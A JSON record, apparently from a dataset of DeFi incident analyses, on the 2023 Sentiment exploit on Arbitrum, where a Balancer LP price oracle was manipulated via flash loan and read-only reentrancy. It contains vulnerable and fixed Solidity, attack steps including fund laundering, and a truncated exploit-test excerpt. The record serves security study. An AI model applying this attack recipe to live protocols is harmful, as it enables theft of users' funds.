@@ -1,0 +1,46 @@
+{
+ "id": "2023__2023-04-04_Sentiment_BalancerOracleManipulation_ARB",
+ "source_file": "2023/2023-04-04_Sentiment_BalancerOracleManipulation_ARB.md",
+ "title": "Sentiment — Balancer Pool Price Dependency Vulnerability Analysis",
+ "date": "2023-04-04",
+ "protocol": "Sentiment",
+ "chain": "Arbitrum",
+ "loss_raw": "~$1,000,000",
+ "loss_usd": 1000000.0,
+ "root_cause": "Balancer pool spot price-dependent oracle susceptible to flash loan + read-only reentrancy manipulation",
+ "attack_tx": "0xa9ff2b58...",
+ "vulnerable_contract": "WeightedBalancerLPOracle",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable oracle code (inferred logic)\nfunction getPrice(address token) external view returns (uint256) {\n    IBalancerToken bToken = IBalancerToken(token);\n    bytes32 poolId = bToken.getPoolId();\n\n    // ❌ Reads current pool balances directly from Balancer Vault\n    // During exitPool() callback, internal balances are not yet updated,\n    // causing the calculation to appear as if more balance remains than actually does\n    (address[] memory tokens, uint256[] memory balances,) =\n        IBalancerVault(BALANCER_VAULT).getPoolTokens(poolId);\n\n    // ❌ Weighted average price calculated from instantaneous balances → manipulable\n    uint256 price = _calculateWeightedPrice(tokens, balances);\n    return price;\n}",
+  "// ❌ Vulnerable borrow logic (inferred)\nfunction borrow(address account, address token, uint256 amt) external {\n    // ❌ References manipulated oracle price when called during reentrancy callback\n    uint256 collateralValue = _getCollateralValue(account); // includes oracle call\n    uint256 borrowValue = _getBorrowValue(account);\n\n    // Health check passes due to manipulated collateralValue\n    require(collateralValue >= borrowValue + amt, \"insufficient collateral\");\n\n    _borrow(account, token, amt);\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — using Balancer VaultReentrancyLib\nimport { VaultReentrancyLib } from \"@balancer/VaultReentrancyLib.sol\";\n\nfunction getPrice(address token) external view returns (uint256) {\n    // ✅ Checks Balancer Vault reentrancy state — reverts if called during callback\n    VaultReentrancyLib.ensureNotInVaultContext(IVault(BALANCER_VAULT));\n\n    IBalancerToken bToken = IBalancerToken(token);\n    bytes32 poolId = bToken.getPoolId();\n\n    (address[] memory tokens, uint256[] memory balances,) =\n        IBalancerVault(BALANCER_VAULT).getPoolTokens(poolId);\n\n    uint256 price = _calculateWeightedPrice(tokens, balances);\n    return price;\n}",
+  "// ✅ Fix direction — block reentrancy at oracle level + additional defense layer\nfunction borrow(address account, address token, uint256 amt) external nonReentrant {\n    // ✅ Add self-contained reentrancy guard (additional defense layer when depending on LP oracle)\n    uint256 collateralValue = _getCollateralValue(account);\n    uint256 borrowValue = _getBorrowValue(account);\n    require(collateralValue >= borrowValue + amt, \"insufficient collateral\");\n    _borrow(account, token, amt);\n}"
+ ],
+ "steps": [
+  "Step 1: Aave V3 Flash Loan",
+  "Step 2: Open Sentiment Account + Deposit Collateral",
+  "50 WETH → AccountManager.deposit()",
+  "AccountManager.exec() → Balancer joinPool()",
+  "(Add 50 WETH as LP to Balancer pool → register as",
+  "Step 3: Large-Scale Balancer joinPool() — Price Inflation",
+  "606 WBTC + 10,000 WETH + 18,000,000 USDC",
+  "→ Supply liquidity to Balancer pool (receive LP",
+  "Step 4: exitPool() — Critical Vulnerable Window",
+  "oracle.getPrice() → returns inflated LP",
+  "Step 5: Laundering Borrowed Funds via Aave V3",
+  "FRAX → FraxBP (Curve) swap → receive USDC",
+  "USDC, USDT, WETH → Aave V3 supply()",
+  "Aave V3 withdraw() → attacker wallet receives funds",
+  "Step 6: Repay Aave V3 Flash Loan",
+  "Repay WBTC, WETH, USDC with fees → attack complete"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────┐\n│                 Attacker (0xdd0c...e49C3)                    │\n│           Attack Contract (0x9f62...eA9D0)                   │\n└────────────────────────┬────────────────────────────────────┘\n                         │ testExploit() called\n                         ▼\n┌─────────────────────────────────────────────────────────────┐\n│  Step 1: Aave V3 Flash Loan                                  │\n│  ┌──────────────────────────────────────────────────────┐   │\n│  │  WBTC: 606 (~$17M)                                   │   │\n│  │  WETH: 10,050 (~$20M)                                │   │\n│  │  USDC: 18,000,000 (~$18M)                            │   │\n│  │  Total ~$55M uncollateralized loan                   │   │\n│  └──────────────",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// Key attack functions excerpted — full code: DeFiHackLabs/src/test/2023-04/Sentiment_exp.sol\n\ncontract ContractTest is Test {\n    // [Step 1] Attack entry point — request Aave V3 flash loan\n    function testExploit() external {\n        address[] memory assets = new address[](3);\n        assets[0] = address(WBTC);  // 606 WBTC\n        assets[1] = address(WETH);  // 10,050 WETH\n        assets[2] = address(USDC);  // 18,000,000 USDC\n\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 606 * 1e8;\n        amounts[1] = 10_050_100 * 1e15;\n        amounts[2] = 18_000_000 * 1e6;\n\n        // ← Request ~$55M flash loan from Aave V3\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\","
+ ]
+}
